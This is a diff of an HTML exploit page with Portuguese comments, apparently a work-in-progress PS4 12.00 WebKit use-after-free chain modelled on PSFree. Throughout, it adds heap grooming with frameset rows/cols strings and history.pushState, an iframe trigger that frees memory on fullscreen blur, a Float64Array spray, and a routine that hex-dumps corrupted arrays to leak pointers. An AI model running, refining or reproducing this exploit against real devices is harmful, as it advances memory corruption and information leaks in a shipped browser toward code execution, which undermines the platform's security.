@@ -2,75 +2,193 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 History UAF - Leandro</title>
+    <title>PS4 12.00 - PSFree Integration</title>
+    <style>
+        body { background-color: #1a1a1a; color: #fff; font-family: monospace; padding: 20px; }
+        button { padding: 15px; font-weight: bold; cursor: pointer; margin-right: 10px; }
+        #log-area { background: #000; color: #0f0; padding: 15px; border: 1px solid #333; height: 350px; overflow-y: scroll; display: none; margin-top: 20px;}
+        .highlight { color: #fff; background-color: #d32f2f; padding: 2px; }
+    </style>
 </head>
-<body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">
+<body>
 
-    <h1>PS4 12.00 - History State UAF</h1>
-    <p>Status: <span id="status-pai" style="font-weight:bold;">Aguardando...</span></p>
+    <h2>PS4 12.00 - UAF Exploit Chain (PSFree Based)</h2>
+    <p>Status: <span id="status" style="color: #ffeb3b;">Aguardando Preparação...</span></p>
 
-    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Pai</button>
-    <button onclick="triggerUAF()" style="padding: 12px;">2. Disparar History UAF</button>
-    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar</button>
+    <button onclick="prepareMemory()" style="background: #e0e0e0; color: #000;">1. Heap Grooming (PSFree)</button>
+    <button onclick="injectTrigger()" style="background: #e0e0e0; color: #000;">2. Injetar Gatilho (Iframe)</button>
+    <button onclick="verifyLeak()" style="background: #4caf50; color: #fff;">3. Memory Dump (0x50)</button>
+
+    <div id="log-area"></div>
+    <div id="frame-container" style="margin-top: 20px;"></div>
 
     <script>
-        const PATTERN = 2.121995791e-314; 
+        // Configurações do PSFree
+        const ssv_len = 0x50; // 80 bytes (O tamanho mágico que você descobriu)
+        const PATTERN = 2.121995791e-314; // 0x41414141...
+        
+        // Variáveis Globais
+        let fsets = [];
+        let indices = [];
         let controllers = [];
-        const statusPai = document.getElementById('status-pai');
+        let original_loc = location.pathname;
+        const statusEl = document.getElementById('status');
+        const logArea = document.getElementById('log-area');
 
-        function prepareObjects() {
+        // Função utilitária para Hexdump (Inspirada no utils.mjs)
+        function hex(number) {
+            return "0x" + number.toString(16).padStart(16, '0');
+        }
+
+        // ==========================================
+        // PASSO 1: O Grooming exato do PSFree.mjs
+        // ==========================================
+        function prepareMemory() {
             controllers = [];
-            // Dummy call para inicializar o alocador (Técnica PSFree)
-            history.replaceState("init", "");
+            fsets = [];
+            indices = [];
             
+            // O rows_str gera um objeto de 80 bytes no fastMalloc
+            const rows_str = ",".repeat(ssv_len / 8 - 2); 
+
+            function alloc_fs(size) {
+                for (let i = 0; i < size / 2; i++) {
+                    let fset = document.createElement("frameset");
+                    fset.rows = rows_str;
+                    fset.cols = rows_str;
+                    fsets.push(fset);
+                }
+            }
+
+            statusEl.innerText = "Preparando Heap e Histórico...";
+
+            // Dummy call do PSFree para inicializar o alocador
+            history.replaceState("state0", "");
+            alloc_fs(0x180);
+
+            // Alocando objetos SSV no histórico
+            history.pushState("state1", "", original_loc + "#bar");
+            indices.push(fsets.length);
+            alloc_fs(0x40);
+
+            history.pushState("state1", "", original_loc + "#foo");
+            indices.push(fsets.length);
+            alloc_fs(0x40);
+
+            history.pushState("state2", "");
+
+            // Criamos os nossos leitores (Float64Array de tamanho 10 = 80 bytes)
             for(let i = 0; i < 5000; i++) {
                 let arr = new Float64Array(10);
-                arr[0] = i; 
+                arr[0] = i;
                 controllers.push(arr);
             }
-            statusPai.innerText = "Objetos prontos e alocador inicializado.";
+
+            statusEl.innerText = "Memória alinhada (0x50 bytes). Pronto para o gatilho.";
         }
 
-        async function triggerUAF() {
-            document.documentElement.webkitRequestFullscreen();
-            
-            // Lógica simplificada de popstate do PSFree
-            window.onblur = function() {
-                // Criamos estados de histórico para ocupar 80 bytes
-                for (let i = 0; i < 100; i++) {
-                    history.pushState("state" + i, "", "#" + i);
-                }
+        // ==========================================
+        // PASSO 2: O Iframe de Ataque e Saída de Tela
+        // ==========================================
+        function injectTrigger() {
+            const container = document.getElementById('frame-container');
+            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:100px; border:2px dashed red;"></iframe>';
+            const fDoc = document.getElementById('pocFrame').contentWindow.document;
 
-                // Spray massivo para colidir com os estados liberados
-                let spray = [];
-                for(let i = 0; i < 10000; i++) {
-                    spray.push(new Float64Array(10).fill(PATTERN));
-                }
+            fDoc.open();
+            fDoc.write(`
+                <html><body style="background:#fff; text-align:center;">
+                    <button onclick="startPoC()" style="padding:15px; background:#f44336; color:#fff; font-weight:bold;">DISPARAR UAF (FS + OPTIONS)</button>
+                    <script>
+                        function startPoC() {
+                            // Entra em Fullscreen
+                            document.documentElement.webkitRequestFullscreen();
+                            
+                            window.onblur = function() {
+                                // 1. Força a saída do Fullscreen imediatamente para não travar
+                                if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+                                else if (document.webkitCancelFullScreen) document.webkitCancelFullScreen();
 
-                // Forçamos a volta no histórico para causar a confusão de memória
-                history.back();
+                                // 2. Avisa o Pai para causar o UAF liberando os framesets (Técnica PSFree)
+                                window.parent.triggerUAF_Free();
 
-                setTimeout(() => {
-                    document.open();
-                    document.write('<h1>UAF TRIGGERED</h1>');
-                    document.close();
-                }, 500);
-            };
+                                // 3. Spray de Memória (Substitui o Uint8Array do PSFree pelo nosso array de 80 bytes)
+                                let spray = [];
+                                for (let i = 0; i < 8000; i++) {
+                                    spray.push(new Float64Array(10).fill(${PATTERN}));
+                                }
+
+                                // 4. Voltar no histórico para corromper o estado
+                                history.back();
+
+                                // 5. Teardown
+                                setTimeout(() => {
+                                    document.open();
+                                    document.write('<h2 style="color:green;">TEARDOWN EXECUTADO</h2>');
+                                    document.close();
+                                }, 600);
+                            };
+                        }
+                    <\/script>
+                </body></html>
+            `);
+            fDoc.close();
+            statusEl.innerText = "Iframe pronto. Entre em Fullscreen e aperte OPTIONS.";
         }
 
-        function checkPersistence() {
+        // Função chamada pelo iframe no momento do Blur
+        window.triggerUAF_Free = function() {
+            // Liberamos a SmallLine onde o SSV reside (Linha 230 do psfree.mjs)
+            let target_idx = indices[1]; 
+            for (let i = target_idx - 4; i < target_idx + 4; i++) {
+                if (fsets[i]) {
+                    fsets[i].rows = "";
+                    fsets[i].cols = "";
+                }
+            }
+        };
+
+        // ==========================================
+        // PASSO 3: Validação de Memória (Dump Hexadecimal)
+        // ==========================================
+        function verifyLeak() {
             let corrupted = null;
+            let corruptedIndex = -1;
+
+            // Busca na array base
             for(let i = 0; i < controllers.length; i++) {
-                if (controllers[i][0] === PATTERN) {
+                if (controllers[i][0] !== i) { // Se mudou do ID original, foi corrompido!
                     corrupted = controllers[i];
+                    corruptedIndex = i;
                     break;
                 }
             }
 
+            logArea.style.display = "block";
+            logArea.innerHTML = "<b>[ INICIANDO ANÁLISE DE MEMÓRIA ]</b><br>";
+
             if (corrupted) {
-                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO! ID Corrompido detectado.</span>";
+                statusEl.innerHTML = "<span style='color:#4caf50;'>✓ UAF SUCESSO! Array de 80 bytes corrompida no ID: " + corruptedIndex + "</span>";
+                logArea.innerHTML += "Vazamento detectado no índice " + corruptedIndex + ". Despejando RAM:<br><br>";
+
+                // Leitura dos 80 bytes (10 offsets de 64 bits)
+                for(let i = 0; i < 10; i++) {
+                    const val = corrupted[i];
+                    const buf = new ArrayBuffer(8);
+                    new Float64Array(buf)[0] = val;
+                    const hexStr = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
+                    
+                    // Lógica de Highlight: Destaca ponteiros de sistema (Diferentes de zero e do nosso spray)
+                    let isPtr = (hexStr !== "0000000000000000" && !hexStr.includes("41414141"));
+                    let css = isPtr ? "class='highlight'" : "";
+                    
+                    logArea.innerHTML += "Offset [" + i + "]: <span " + css + ">0x" + hexStr + "</span><br>";
+                }
+                
+                logArea.innerHTML += "<br><b>Análise:</b> Se você ver valores em vermelho, você obteve um Information Leak real!";
             } else {
-                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: O sistema limpou a memória.</span>";
+                statusEl.innerHTML = "<span style='color:#f44336;'>✗ FALHA: Nenhuma corrupção detectada. O UAF não foi acionado a tempo.</span>";
+                logArea.innerHTML += "Memória intacta. O Garbage Collector limpou o rastro.<br>Tente reiniciar a página para limpar a fragmentação do Heap.";
             }
         }
     </script>
